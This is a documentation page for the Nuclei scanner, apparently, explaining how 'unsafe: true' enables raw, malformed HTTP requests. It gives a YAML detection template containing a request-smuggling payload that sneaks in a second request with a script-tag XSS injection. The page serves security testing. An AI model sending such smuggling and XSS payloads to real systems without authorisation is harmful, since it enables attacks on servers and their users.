title: "Unsafe HTTP Requests"
---

Nuclei supports [rawhttp](https://github.com/projectdiscovery/rawhttp) for complete request control and customization allowing **any kind of malformed requests** for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more.

**rawhttp** library is disabled by default and can be enabled by including `unsafe: true` in the request block. 

Here is an example of HTTP request smuggling detection template using `rawhttp`. 

```yaml
http:
  - raw:
    - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 150
        Transfer-Encoding: chunked

        0

        GET /post?postId=5 HTTP/1.1
        User-Agent: a"/><script>alert(1)</script>
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 5

        x=1
    - |+
        GET /post?postId=5 HTTP/1.1
        Host: {{Hostname}}

    unsafe: true # Enables rawhttp client
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<script>alert(1)</script>")'
```
